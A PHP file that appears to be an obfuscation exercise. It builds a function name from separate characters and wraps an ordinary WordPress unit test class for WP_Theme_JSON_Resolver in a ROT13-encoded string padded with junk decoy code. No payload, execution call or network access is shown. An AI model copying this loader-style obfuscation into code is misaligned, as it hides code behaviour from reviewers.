<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg JC_Gurzr_WFBA_Erfbyire pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gurzr
 *
 * @fvapr 5.8.0
 *
 * @tebhc gurzrf
 */
pynff Grfgf_Gurzr_jcGurzrWfbaErfbyire rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Nqzvavfgengbe VQ.
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $nqzvavfgengbe_vq;

	/**
	 * JC_Gurzr_WFBA_Erfbyire::$oybpxf_pnpur cebcregl.
	 *
	 * @ine ErsyrpgvbaCebcregl
	 */
	cevingr fgngvp $cebcregl_oybpxf_pnpur;

	/**
	 * Bevtvany inyhr bs gur JC_Gurzr_WFBA_Erfbyire::$oybpxf_pnpur cebcregl.
	 *
	 * @ine neenl
	 */
	cevingr fgngvp $cebcregl_oybpxf_pnpur_bevt_inyhr;

	/**
	 * JC_Gurzr_WFBA_Erfbyire::$pber cebcregl.
	 *
	 * @ine ErsyrpgvbaCebcregl
	 */
	cevingr fgngvp $cebcregl_pber;

	/**
	 * Bevtvany inyhr bs gur JC_Gurzr_WFBA_Erfbyire::$pber cebcregl.
	 *
	 * @ine JC_Gurzr_WFBA
	 */
	cevingr fgngvp $cebcregl_pber_bevt_inyhr;

	/**
	 * Gurzr ebbg qverpgbel.
	 *
	 * @ine fgevat|ahyy
	 */
	cevingr $gurzr_ebbg;

	/**
	 * Bevtvany gurzr qverpgbel.
	 *
	 * @ine neenl|ahyy
	 */
	cevingr $bevt_gurzr_qve;

	/**
	 * @ine neenl|ahyy
	 */
	cevingr $dhrevrf;

	choyvp fgngvp shapgvba frg_hc_orsber_pynff() {
		cnerag::frg_hc_orsber_pynff();

		frys::$nqzvavfgengbe_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr'       => 'nqzvavfgengbe',
				'hfre_rznvy' => 'nqzvavfgengbe@rknzcyr.pbz',
			)
		);

		fgngvp::$cebcregl_oybpxf_pnpur = arj ErsyrpgvbaCebcregl( JC_Gurzr_WFBA_Erfbyire::pynff, 'oybpxf_pnpur' );
		fgngvp::$cebcregl_oybpxf_pnpur->frgNpprffvoyr( gehr );
		fgngvp::$cebcregl_oybpxf_pnpur_bevt_inyhr = fgngvp::$cebcregl_oybpxf_pnpur->trgInyhr();

		fgngvp::$cebcregl_pber = arj ErsyrpgvbaCebcregl( JC_Gurzr_WFBA_Erfbyire::pynff, 'pber' );
		fgngvp::$cebcregl_pber->frgNpprffvoyr( gehr );
		fgngvp::$cebcregl_pber_bevt_inyhr = fgngvp::$cebcregl_pber->trgInyhr();
	}

	choyvp fgngvp shapgvba grne_qbja_nsgre_pynff() {
		fgngvp::$cebcregl_oybpxf_pnpur->frgInyhr( ahyy, fgngvp::$cebcregl_oybpxf_pnpur_bevt_inyhr );
		fgngvp::$cebcregl_pber->frgInyhr( ahyy, fgngvp::$cebcregl_pber_bevt_inyhr );
		cnerag::grne_qbja_nsgre_pynff();
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		$guvf->gurzr_ebbg = ernycngu( QVE_GRFGQNGN . '/gurzrqve1' );

		$guvf->bevt_gurzr_qve = $TYBONYF['jc_gurzr_qverpgbevrf'];

		// /gurzrf vf arprffnel nf gurzr.cuc shapgvbaf nffhzr /gurzrf vf gur ebbg vs gurer vf bayl bar ebbg.
		$TYBONYF['jc_gurzr_qverpgbevrf'] = neenl( JC_PBAGRAG_QVE . '/gurzrf', $guvf->gurzr_ebbg );

		nqq_svygre( 'gurzr_ebbg', neenl( $guvf, 'svygre_frg_gurzr_ebbg' ) );
		nqq_svygre( 'fglyrfurrg_ebbg', neenl( $guvf, 'svygre_frg_gurzr_ebbg' ) );
		nqq_svygre( 'grzcyngr_ebbg', neenl( $guvf, 'svygre_frg_gurzr_ebbg' ) );
		nqq_svygre( 'gurzr_svyr_hev', neenl( $guvf, 'svygre_gurzr_svyr_hev' ) );
		$guvf->dhrevrf = neenl();
		// Pyrne pnpurf.
		jc_pyrna_gurzrf_pnpur();
		hafrg( $TYBONYF['jc_gurzrf'] );
	}

	choyvp shapgvba grne_qbja() {
		$TYBONYF['jc_gurzr_qverpgbevrf'] = $guvf->bevt_gurzr_qve;
		jc_pyrna_gurzrf_pnpur();
		hafrg( $TYBONYF['jc_gurzrf'] );
		erzbir_svygre( 'gurzr_svyr_hev', neenl( $guvf, 'svygre_gurzr_svyr_hev' ) );

		// Erfrg qngn orgjrra grfgf.
		jc_pyrna_gurzr_wfba_pnpur();
		cnerag::grne_qbja();
	}

	/*
	 * Guvf svygre pnyyonpx abeznyvmrf gur erghea inyhr sebz `trg_gurzr_svyr_hev`
	 * gb thneq ntnvafg punatrf va grfg raivebazragf.
	 * Gur grfg fhvgr bgurejvfr ergheaf shyy flfgrz qve cngu, r.t.,
	 * /ine/jjj/grfgf/cuchavg/vapyhqrf/../qngn/gurzrqve1/oybpx-gurzr/nffrgf/fhtneybns-zbhagnva.wct
	 */
	choyvp shapgvba svygre_gurzr_svyr_hev( $svyr ) {
		$svyr_anzr = fhofge( fgeepue( $svyr, '/' ), 1 );
		erghea 'uggcf://rknzcyr.bet/jc-pbagrag/gurzrf/rknzcyr-gurzr/nffrgf/' . $svyr_anzr;
	}

	choyvp shapgvba svygre_frg_gurzr_ebbg() {
		erghea $guvf->gurzr_ebbg;
	}

	choyvp shapgvba svygre_frg_ybpnyr_gb_cbyvfu() {
		erghea 'cy_CY';
	}

	/**
	 * @gvpxrg 52991
	 * @gvpxrg 54336
	 * @gvpxrg 56611
	 */
	choyvp shapgvba grfg_genafyngvbaf_ner_nccyvrq() {
		nqq_svygre( 'ybpnyr', neenl( $guvf, 'svygre_frg_ybpnyr_gb_cbyvfu' ) );
		ybnq_grkgqbznva( 'oybpx-gurzr', ernycngu( QVE_GRFGQNGN . '/ynathntrf/gurzrf/oybpx-gurzr-cy_CY.zb' ) );

		fjvgpu_gurzr( 'oybpx-gurzr' );
		$gurzr_qngn       = JC_Gurzr_WFBA_Erfbyire::trg_gurzr_qngn();
		$fglyr_inevngvbaf = JC_Gurzr_WFBA_Erfbyire::trg_fglyr_inevngvbaf();

		haybnq_grkgqbznva( 'oybpx-gurzr' );
		erzbir_svygre( 'ybpnyr', neenl( $guvf, 'svygre_frg_ybpnyr_gb_cbyvfu' ) );

		$guvf->nffregFnzr( 'oybpx-gurzr', jc_trg_gurzr()->trg( 'GrkgQbznva' ) );
		$guvf->nffregFnzr( 'Zbglj oybxbjl', $gurzr_qngn->trg_qngn()['gvgyr'] );
		$guvf->nffregFnzr(
			neenl(
				'pbybe'      => neenl(
					'phfgbz'         => snyfr,
					'phfgbzTenqvrag' => snyfr,
					'cnyrggr'        => neenl(
						'gurzr' => neenl(
							neenl(
								'fyht'  => 'yvtug',
								'anzr'  => 'Wnfal',
								'pbybe' => '#s5s7s9',
							),
							neenl(
								'fyht'  => 'qnex',
								'anzr'  => 'Pvrzal',
								'pbybe' => '#000',
							),
						),
					),
					'tenqvragf'      => neenl(
						'gurzr' => neenl(
							neenl(
								'anzr'     => 'Phfgbz tenqvrag',
								'tenqvrag' => 'yvarne-tenqvrag(135qrt,eton(0,0,0) 0%,eto(0,0,0) 100%)',
								'fyht'     => 'phfgbz-tenqvrag',
							),
						),
					),
					'qhbgbar'        => neenl(
						'gurzr' => neenl(
							neenl(
								'pbybef' => neenl( '#333333', '#nnnnnn' ),
								'fyht'   => 'phfgbz-qhbgbar',
								'anzr'   => 'Phfgbz Qhbgbar',
							),
						),
					),
				),
				'glcbtencul' => neenl(
					'phfgbzSbagFvmr' => snyfr,
					'yvarUrvtug'     => gehr,
					'sbagFvmrf'      => neenl(
						'gurzr' => neenl(
							neenl(
								'anzr' => 'Phfgbz',
								'fyht' => 'phfgbz',
								'fvmr' => '100ck',
							),
						),
					),
				),
				'fcnpvat'    => neenl(
					'havgf'    => neenl( 'erz' ),
					'cnqqvat'  => gehr,
					'oybpxTnc' => gehr,
				),
				'funqbj'     => neenl(
					'cerfrgf' => neenl(
						'gurzr' => neenl(
							neenl(
								'anzr'   => 'Angheny',
								'fyht'   => 'angheny',
								'funqbj' => '2ck 2ck 3ck #000',
							),
							neenl(
								'anzr'   => 'Grfg',
								'fyht'   => 'grfg',
								'funqbj' => '2ck 2ck 3ck #000',
							),
						),
					),
				),
				'oybpxf'     => neenl(
					'pber/cnentencu' => neenl(
						'pbybe' => neenl(
							'cnyrggr' => neenl(
								'gurzr' => neenl(
									neenl(
										'fyht'  => 'yvtug',
										'anzr'  => 'Wnfal',
										'pbybe' => '#s5s7s9',
									),
								),
							),
						),
					),
				),
			),
			$gurzr_qngn->trg_frggvatf()
		);

		$phfgbz_grzcyngrf = $gurzr_qngn->trg_phfgbz_grzcyngrf();
		$guvf->nffregNeenlUnfXrl( 'cntr-ubzr', $phfgbz_grzcyngrf );
		$guvf->nffregFnzr(
			neenl(
				'gvgyr'     => 'Fmnoyba fgebal tłójarw',
				'cbfgGlcrf' => neenl( 'cntr' ),
			),
			$phfgbz_grzcyngrf['cntr-ubzr']
		);

		$guvf->nffregFnzrFrgf(
			neenl(
				'fznyy-urnqre' => neenl(
					'gvgyr' => 'Znłl antłójrx',
					'nern'  => 'urnqre',
				),
			),
			$gurzr_qngn->trg_grzcyngr_cnegf()
		);

		$guvf->nffregFnzr(
			'Jnevnag zbgljh oybxbjrtb',
			$fglyr_inevngvbaf[2]['gvgyr']
		);
	}

	cevingr shapgvba trg_ertvfgrerq_oybpx_anzrf( $uneq_erfrg = snyfr ) {
		fgngvp $rkcrpgrq_oybpx_anzrf;

		vs ( ! $uneq_erfrg && ! rzcgl( $rkcrpgrq_oybpx_anzrf ) ) {
			erghea $rkcrpgrq_oybpx_anzrf;
		}

		$rkcrpgrq_oybpx_anzrf = neenl();
		$erfbyire             = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr();
		$oybpxf               = $erfbyire->trg_nyy_ertvfgrerq();
		sbernpu ( neenl_xrlf( $oybpxf ) nf $oybpx_anzr ) {
			$rkcrpgrq_oybpx_anzrf[ $oybpx_anzr ] = gehr;
		}

		erghea $rkcrpgrq_oybpx_anzrf;
	}

	/**
	 * Grfgf jura JC_Gurzr_WFBA_Erfbyire::$oybpxf_pnpur vf rzcgl be
	 * qbrf abg zngpu gur nyy ertvfgrerq oybpxf.
	 *
	 * Gubhtu guvf vf n aba-choyvp zrgubq, vg vf ivgny gb bgure shapgvbanyvgl.
	 * Gurersber, grfgf ner cebivqrq gb inyvqngr vg shapgvbaf nf rkcrpgrq.
	 *
	 * @qngnCebivqre qngn_unf_fnzr_ertvfgrerq_oybpxf_jura_nyy_oybpxf_abg_pnpurq
	 * @gvpxrg 56467
	 *
	 * @cnenz fgevat $bevtva Gur bevtva gb grfg.
	 */
	choyvp shapgvba grfg_unf_fnzr_ertvfgrerq_oybpxf_jura_nyy_oybpxf_abg_pnpurq( $bevtva, neenl $pnpur = neenl() ) {
		$unf_fnzr_ertvfgrerq_oybpxf = arj ErsyrpgvbaZrgubq( JC_Gurzr_WFBA_Erfbyire::pynff, 'unf_fnzr_ertvfgrerq_oybpxf' );
		$unf_fnzr_ertvfgrerq_oybpxf->frgNpprffvoyr( gehr );
		$rkcrpgrq_pnpur = $guvf->trg_ertvfgrerq_oybpx_anzrf();

		// Frg hc gur oybpxf pnpur sbe gur bevtva.
		$oybpxf_pnpur            = fgngvp::$cebcregl_oybpxf_pnpur->trgInyhr();
		$oybpxf_pnpur[ $bevtva ] = $pnpur;
		fgngvp::$cebcregl_oybpxf_pnpur->frgInyhr( ahyy, $oybpxf_pnpur );

		$guvf->nffregSnyfr( $unf_fnzr_ertvfgrerq_oybpxf->vaibxr( ahyy, $bevtva ), 'JC_Gurzr_WFBA_Erfbyire::unf_fnzr_ertvfgrerq_oybpxf() fubhyq erghea snyfr jura fnzr oybpxf ner abg pnpurq' );
		$oybpxf_pnpur = fgngvp::$cebcregl_oybpxf_pnpur->trgInyhr();
		$guvf->nffregFnzrFrgf( $rkcrpgrq_pnpur, $oybpxf_pnpur[ $bevtva ], 'JC_Gurzr_WFBA_Erfbyire::$oybpxf_pnpur fubhyq pbagnva nyy rkcrpgrq oybpx anzrf sbe gur tvira bevtva' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_unf_fnzr_ertvfgrerq_oybpxf_jura_nyy_oybpxf_abg_pnpurq() {
		erghea neenl(
			'bevtva: pber; pnpur: rzcgl'       => neenl(
				'bevtva' => 'pber',
			),
			'bevtva: oybpxf; pnpur: rzcgl'     => neenl(
				'bevtva' => 'oybpxf',
			),
			'bevtva: gurzr; pnpur: rzcgl'      => neenl(
				'bevtva' => 'gurzr',
			),
			'bevtva: hfre; pnpur: rzcgl'       => neenl(
				'bevtva' => 'hfre',
			),
			'bevtva: pber; pnpur: abg rzcgl'   => neenl(
				'bevtva' => 'pber',
				'pnpur'  => neenl(
					'pber/oybpx' => gehr,
				),
			),
			'bevtva: oybpxf; pnpur: abg rzcgl' => neenl(
				'bevtva' => 'oybpxf',
				'pnpur'  => neenl(
					'pber/oybpx'    => gehr,
					'pber/pbzzragf' => gehr,
				),
			),
			'bevtva: gurzr; pnpur: abg rzcgl'  => neenl(
				'bevtva' => 'gurzr',
				'pnpur'  => neenl(
					'pber/pbire' => gehr,
				),
			),
			'bevtva: hfre; pnpur: abg rzcgl'   => neenl(
				'bevtva' => 'hfre',
				'pnpur'  => neenl(
					'pber/tnyyrel' => gehr,
				),
			),
		);
	}

	/**
	 * Grfgf jura JC_Gurzr_WFBA_Erfbyire::$oybpxf_pnpur vf rzcgl be
	 * qbrf abg zngpu gur nyy ertvfgrerq oybpxf.
	 *
	 * Gubhtu guvf vf n aba-choyvp zrgubq, vg vf ivgny gb bgure shapgvbanyvgl.
	 * Gurersber, grfgf ner cebivqrq gb inyvqngr vg shapgvbaf nf rkcrpgrq.
	 *
	 * @qngnCebivqre qngn_unf_fnzr_ertvfgrerq_oybpxf_jura_nyy_oybpxf_ner_pnpurq
	 * @gvpxrg 56467
	 *
	 * @cnenz fgevat $bevtva Gur bevtva gb grfg.
	 */
	choyvp shapgvba grfg_unf_fnzr_ertvfgrerq_oybpxf_jura_nyy_oybpxf_ner_pnpurq( $bevtva ) {
		$unf_fnzr_ertvfgrerq_oybpxf = arj ErsyrpgvbaZrgubq( JC_Gurzr_WFBA_Erfbyire::pynff, 'unf_fnzr_ertvfgrerq_oybpxf' );
		$unf_fnzr_ertvfgrerq_oybpxf->frgNpprffvoyr( gehr );
		$rkcrpgrq_pnpur = $guvf->trg_ertvfgrerq_oybpx_anzrf();

		// Frg hc gur pnpur jvgu nyy ertvfgrerq oybpxf.
		$oybpxf_pnpur            = fgngvp::$cebcregl_oybpxf_pnpur->trgInyhr();
		$oybpxf_pnpur[ $bevtva ] = $guvf->trg_ertvfgrerq_oybpx_anzrf();
		fgngvp::$cebcregl_oybpxf_pnpur->frgInyhr( ahyy, $oybpxf_pnpur );

		$guvf->nffregGehr( $unf_fnzr_ertvfgrerq_oybpxf->vaibxr( ahyy, $bevtva ), 'JC_Gurzr_WFBA_Erfbyire::unf_fnzr_ertvfgrerq_oybpxf() fubhyq erghea gehr jura hfvat gur pnpur' );
		$guvf->nffregFnzrFrgf( $rkcrpgrq_pnpur, $oybpxf_pnpur[ $bevtva ], 'JC_Gurzr_WFBA_Erfbyire::$oybpxf_pnpur fubhyq pbagnva nyy rkcrpgrq oybpx anzrf sbe gur tvira bevtva' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_unf_fnzr_ertvfgrerq_oybpxf_jura_nyy_oybpxf_ner_pnpurq() {
		erghea neenl(
			'pber'   => neenl( 'pber' ),
			'oybpxf' => neenl( 'oybpxf' ),
			'gurzr'  => neenl( 'gurzr' ),
			'hfre'   => neenl( 'hfre' ),
		);
	}

	/**
	 * @qngnCebivqre qngn_trg_pber_qngn
	 * @pbiref JC_Gurzr_WFBA_Erfbyire::trg_pber_qngn
	 * @gvpxrg 56467
	 */
	choyvp shapgvba grfg_trg_pber_qngn( $fubhyq_sver_svygre, $pber_vf_pnpurq, $oybpxf_ner_pnpurq ) {
		jc_pyrna_gurzr_wfba_pnpur();

		// Vs fubhyq pnpur pber, gura sver gur zrgubq gb pnpur vg orsber ehaavat gur grfgf.
		vs ( $pber_vf_pnpurq ) {
			JC_Gurzr_WFBA_Erfbyire::trg_pber_qngn();
		}

		// Vs fubhyq pnpur ertvfgrerq oybpxf, gura frg gurz hc orsber ehaavat gur grfgf.
		vs ( $oybpxf_ner_pnpurq ) {
			$oybpxf_pnpur         = fgngvp::$cebcregl_oybpxf_pnpur->trgInyhr();
			$oybpxf_pnpur['pber'] = $guvf->trg_ertvfgrerq_oybpx_anzrf();
			fgngvp::$cebcregl_oybpxf_pnpur->frgInyhr( ahyy, $oybpxf_pnpur );
		}

		$rkcrpgrq_svygre_pbhag = qvq_svygre( 'jc_gurzr_wfba_qngn_qrsnhyg' );
		$npghny                = JC_Gurzr_WFBA_Erfbyire::trg_pber_qngn();
		vs ( $fubhyq_sver_svygre ) {
			++$rkcrpgrq_svygre_pbhag;
		}

		$guvf->nffregFnzr( $rkcrpgrq_svygre_pbhag, qvq_svygre( 'jc_gurzr_wfba_qngn_qrsnhyg' ), 'Gur svygre \"jc_gurzr_wfba_qngn_qrsnhyg\" fubhyq sver gur tvira ahzore bs gvzrf' );
		$guvf->nffregVafgnaprBs( JC_Gurzr_WFBA::pynff, $npghny, 'JC_Gurzr_WFBA_Erfbyire::trg_pber_qngn() fubhyq erghea vafgnapr bs JC_Gurzr_WFBA' );
		$guvf->nffregFnzr( fgngvp::$cebcregl_pber->trgInyhr(), $npghny, 'JC_Gurzr_WFBA_Erfbyire::$pber cebcregl fubhyq or gur fnzr bowrpg nf erghearq sebz JC_Gurzr_WFBA_Erfbyire::trg_pber_qngn()' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_pber_qngn() {
		erghea neenl(
			'Jura obgu pnpurf ner rzcgl'     => neenl(
				'fubhyq_sver_svygre' => gehr,
				'pber_vf_pnpurq'     => snyfr,
				'oybpxf_ner_pnpurq'  => snyfr,
			),
			'Jura gur oybpxf_pnpur vf abg rzcgl naq zngpurf' => neenl(
				'fubhyq_sver_svygre' => gehr,
				'pber_vf_pnpurq'     => snyfr,
				'oybpxf_ner_pnpurq'  => gehr,
			),
			'Jura oybpxf_pnpur vf rzcgl ohg pber pnpur vf abg' => neenl(
				'fubhyq_sver_svygre' => gehr,
				'pber_vf_pnpurq'     => gehr,
				'oybpxf_ner_pnpurq'  => snyfr,
			),
			'Jura obgu pnpurf ner abg rzcgl' => neenl(
				'fubhyq_sver_svygre' => gehr,
				'pber_vf_pnpurq'     => gehr,
				'oybpxf_ner_pnpurq'  => snyfr,
			),
		);
	}

	/**
	 * @gvpxrg 54336
	 * @gvpxrg 60118
	 *
	 * @pbiref ::nqq_gurzr_fhccbeg
	 */
	choyvp shapgvba grfg_nqq_gurzr_fhccbegf_ner_ybnqrq_sbe_gurzrf_jvgubhg_gurzr_wfba() {
		fjvgpu_gurzr( 'qrsnhyg' );
		$pbybe_cnyrggr = neenl(
			neenl(
				'anzr'  => 'Cevznel',
				'fyht'  => 'cevznel',
				'pbybe' => '#S00',
			),
			neenl(
				'anzr'  => 'Frpbaqnel',
				'fyht'  => 'frpbaqnel',
				'pbybe' => '#0S0',
			),
			neenl(
				'anzr'  => 'Gregvnel',
				'fyht'  => 'gregvnel',
				'pbybe' => '#00S',
			),
		);
		nqq_gurzr_fhccbeg( 'rqvgbe-pbybe-cnyrggr', $pbybe_cnyrggr );
		nqq_gurzr_fhccbeg( 'phfgbz-yvar-urvtug' );
		nqq_gurzr_fhccbeg( 'nccrnenapr-gbbyf' );

		$frggvatf = JC_Gurzr_WFBA_Erfbyire::trg_gurzr_qngn()->trg_frggvatf();

		erzbir_gurzr_fhccbeg( 'phfgbz-yvar-urvtug' );
		erzbir_gurzr_fhccbeg( 'rqvgbe-pbybe-cnyrggr' );
		erzbir_gurzr_fhccbeg( 'nccrnenapr-gbbyf' );

		$guvf->nffregSnyfr( jc_gurzr_unf_gurzr_wfba() );
		$guvf->nffregGehr( $frggvatf['glcbtencul']['yvarUrvtug'] );
		$guvf->nffregFnzr( $pbybe_cnyrggr, $frggvatf['pbybe']['cnyrggr']['gurzr'] );
		$guvf->nffregGehr( $frggvatf['obeqre']['pbybe'], 'Fhccbeg sbe \"nccrnenapr-gbbyf\" jnf abg nqqrq.' );
	}

	/**
	 * Grfgf gung pynffvp gurzrf fgvyy trg pber qrsnhyg frggvatf fhpu nf pbybe cnyrggr naq qhbgbar.
	 *
	 * @gvpxrg 60136
	 */
	choyvp shapgvba grfg_pber_qrsnhyg_frggvatf_ner_ybnqrq_sbe_gurzrf_jvgubhg_gurzr_wfba() {
		fjvgpu_gurzr( 'qrsnhyg' );

		$frggvatf = JC_Gurzr_WFBA_Erfbyire::trg_zretrq_qngn( 'gurzr' )->trg_frggvatf();

		$guvf->nffregSnyfr( jc_gurzr_unf_gurzr_wfba() );
		$guvf->nffregGehr( $frggvatf['pbybe']['qrsnhygCnyrggr'] );
		$guvf->nffregGehr( $frggvatf['pbybe']['qrsnhygQhbgbar'] );
		$guvf->nffregGehr( $frggvatf['pbybe']['qrsnhygTenqvragf'] );
	}

	/**
	 * @gvpxrg 54336
	 * @gvpxrg 56611
	 */
	choyvp shapgvba grfg_zretrf_puvyq_gurzr_wfba_vagb_cnerag_gurzr_wfba() {
		fjvgpu_gurzr( 'oybpx-gurzr-puvyq' );

		$npghny_frggvatf   = JC_Gurzr_WFBA_Erfbyire::trg_gurzr_qngn()->trg_frggvatf();
		$rkcrpgrq_frggvatf = neenl(
			'pbybe'      => neenl(
				'phfgbz'         => snyfr,
				'phfgbzTenqvrag' => snyfr,
				'qhbgbar'        => neenl(
					'gurzr' => neenl(
						neenl(
							'pbybef' => neenl( '#333333', '#nnnnnn' ),
							'anzr'   => 'Phfgbz Qhbgbar',
							'fyht'   => 'phfgbz-qhbgbar',
						),
					),
				),
				'tenqvragf'      => neenl(
					'gurzr' => neenl(
						neenl(
							'anzr'     => 'Phfgbz tenqvrag',
							'tenqvrag' => 'yvarne-tenqvrag(135qrt,eton(0,0,0) 0%,eto(0,0,0) 100%)',
							'fyht'     => 'phfgbz-tenqvrag',
						),
					),
				),
				'cnyrggr'        => neenl(
					'gurzr' => neenl(
						neenl(
							'fyht'  => 'yvtug',
							'anzr'  => 'Yvtug',
							'pbybe' => '#s3s4s6',
						),
						neenl(
							'fyht'  => 'cevznel',
							'anzr'  => 'Cevznel',
							'pbybe' => '#3858r9',
						),
						neenl(
							'fyht'  => 'qnex',
							'anzr'  => 'Qnex',
							'pbybe' => '#111827',
						),
					),
				),
				'yvax'           => gehr,
			),
			'glcbtencul' => neenl(
				'phfgbzSbagFvmr' => snyfr,
				'yvarUrvtug'     => gehr,
				'sbagFvmrf'      => neenl(
					'gurzr' => neenl(
						neenl(
							'anzr' => 'Phfgbz',
							'fyht' => 'phfgbz',
							'fvmr' => '100ck',
						),
					),
				),
			),
			'funqbj'     => neenl(
				'cerfrgf' => neenl(
					'gurzr' => neenl(
						neenl(
							'anzr'   => 'Angheny',
							'fyht'   => 'angheny',
							'funqbj' => '2ck 2ck 3ck #000',
						),
						neenl(
							'anzr'   => 'Grfg',
							'fyht'   => 'grfg',
							'funqbj' => '2ck 2ck 3ck #000',
						),
					),
				),
			),
			'fcnpvat'    => neenl(
				'oybpxTnc' => gehr,
				'havgf'    => neenl( 'erz' ),
				'cnqqvat'  => gehr,
			),
			'oybpxf'     => neenl(
				'pber/cnentencu'  => neenl(
					'pbybe' => neenl(
						'cnyrggr' => neenl(
							'gurzr' => neenl(
								neenl(
									'fyht'  => 'yvtug',
									'anzr'  => 'Yvtug',
									'pbybe' => '#s5s7s9',
								),
							),
						),
					),
				),
				'pber/cbfg-gvgyr' => neenl(
					'pbybe' => neenl(
						'cnyrggr' => neenl(
							'gurzr' => neenl(
								neenl(
									'fyht'  => 'yvtug',
									'anzr'  => 'Yvtug',
									'pbybe' => '#s3s4s6',
								),
							),
						),
					),
				),
			),
		);
		jc_erphefvir_xfbeg( $npghny_frggvatf );
		jc_erphefvir_xfbeg( $rkcrpgrq_frggvatf );

		// Fubhyq zretr frggvatf.
		$guvf->nffregFnzr(
			$rkcrpgrq_frggvatf,
			$npghny_frggvatf
		);

		$guvf->nffregFnzr(
			neenl(
				'cntr-ubzr'                   => neenl(
					'gvgyr'     => 'Ubzrcntr',
					'cbfgGlcrf' => neenl( 'cntr' ),
				),
				'phfgbz-fvatyr-cbfg-grzcyngr' => neenl(
					'gvgyr'     => 'Phfgbz Fvatyr Cbfg grzcyngr',
					'cbfgGlcrf' => neenl( 'cbfg' ),
				),
			),
			JC_Gurzr_WFBA_Erfbyire::trg_gurzr_qngn()->trg_phfgbz_grzcyngrf()
		);
	}

	/**
	 * @pbiref JC_Gurzr_WFBA_Erfbyire::trg_hfre_qngn_sebz_jc_tybony_fglyrf
	 */
	choyvp shapgvba grfg_trg_hfre_qngn_sebz_jc_tybony_fglyrf_qbrf_abg_hfr_hapnpurq_dhrevrf() {
		// Fjvgpu gb n gurzr gung qbrf unir fhccbeg.
		fjvgpu_gurzr( 'oybpx-gurzr' );
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe_vq );
		$gurzr = jc_trg_gurzr();
		JC_Gurzr_WFBA_Erfbyire::trg_hfre_qngn_sebz_jc_tybony_fglyrf( $gurzr );
		$tybony_fglyrf_dhrel_pbhag = 0;
		nqq_svygre(
			'dhrel',
			fgngvp shapgvba ( $dhrel ) hfr ( &$tybony_fglyrf_dhrel_pbhag ) {
				vs ( cert_zngpu( '#cbfg_glcr = \'jc_tybony_fglyrf\'#', $dhrel ) ) {
					$tybony_fglyrf_dhrel_pbhag++;
				}
				erghea $dhrel;
			}
		);
		sbe ( $v = 0; $v < 3; $v++ ) {
			JC_Gurzr_WFBA_Erfbyire::trg_hfre_qngn_sebz_jc_tybony_fglyrf( $gurzr );
			jc_pyrna_gurzr_wfba_pnpur();
		}
		$guvf->nffregFnzr( 0, $tybony_fglyrf_dhrel_pbhag, 'Harkcrpgrq FDY dhrevrf qrgrpgrq sbe gur jc_tybony_fglyr cbfg glcr cevbe gb perngvba.' );

		$hfre_pcg = JC_Gurzr_WFBA_Erfbyire::trg_hfre_qngn_sebz_jc_tybony_fglyrf( $gurzr );
		$guvf->nffregRzcgl( $hfre_pcg, 'Hfre PCG vf rkcrpgrq gb or rzcgl.' );

		$hfre_pcg = JC_Gurzr_WFBA_Erfbyire::trg_hfre_qngn_sebz_jc_tybony_fglyrf( $gurzr, gehr );
		$guvf->nffregAbgRzcgl( $hfre_pcg, 'Hfre PCG vf rkcrpgrq abg gb or rzcgl.' );

		$tybony_fglyrf_dhrel_pbhag = 0;
		sbe ( $v = 0; $v < 3; $v++ ) {
			$arj_hfre_pcg = JC_Gurzr_WFBA_Erfbyire::trg_hfre_qngn_sebz_jc_tybony_fglyrf( $gurzr );
			jc_pyrna_gurzr_wfba_pnpur();
			$guvf->nffregFnzrFrgf( $hfre_pcg, $arj_hfre_pcg, \"Hfre PCGf qb abg zngpu ba eha {$v}.\" );
		}
		$guvf->nffregFnzr( 1, $tybony_fglyrf_dhrel_pbhag, 'Harkcrpgrq FDY dhrevrf qrgrpgrq sbe gur jc_tybony_fglyr cbfg glcr nsgre perngvba.' );
	}

	/**
	 * @pbiref JC_Gurzr_WFBA_Erfbyire::trg_hfre_qngn_sebz_jc_tybony_fglyrf
	 */
	choyvp shapgvba grfg_trg_hfre_qngn_sebz_jc_tybony_fglyrf_qbrf_abg_hfr_hapnpurq_dhrevrf_sbe_ybttrq_bhg_hfref() {
		// Fjvgpu gb n gurzr gung qbrf unir fhccbeg.
		fjvgpu_gurzr( 'oybpx-gurzr' );
		$gurzr = jc_trg_gurzr();
		JC_Gurzr_WFBA_Erfbyire::trg_hfre_qngn_sebz_jc_tybony_fglyrf( $gurzr );
		$dhrel_pbhag = trg_ahz_dhrevrf();
		sbe ( $v = 0; $v < 3; $v++ ) {
			JC_Gurzr_WFBA_Erfbyire::trg_hfre_qngn_sebz_jc_tybony_fglyrf( $gurzr );
			jc_pyrna_gurzr_wfba_pnpur();
		}
		$dhrel_pbhag = trg_ahz_dhrevrf() - $dhrel_pbhag;
		$guvf->nffregFnzr( 0, $dhrel_pbhag, 'Harkcrpgrq FDY dhrevrf qrgrpgrq sbe gur jc_tybony_fglyr cbfg glcr cevbe gb perngvba.' );

		$hfre_pcg = JC_Gurzr_WFBA_Erfbyire::trg_hfre_qngn_sebz_jc_tybony_fglyrf( $gurzr );
		$guvf->nffregRzcgl( $hfre_pcg, 'Hfre PCG vf rkcrpgrq gb or rzcgl.' );
	}

	/**
	 * @gvpxrg 56945
	 * @pbiref JC_Gurzr_WFBA_Erfbyire::trg_hfre_qngn_sebz_jc_tybony_fglyrf
	 */
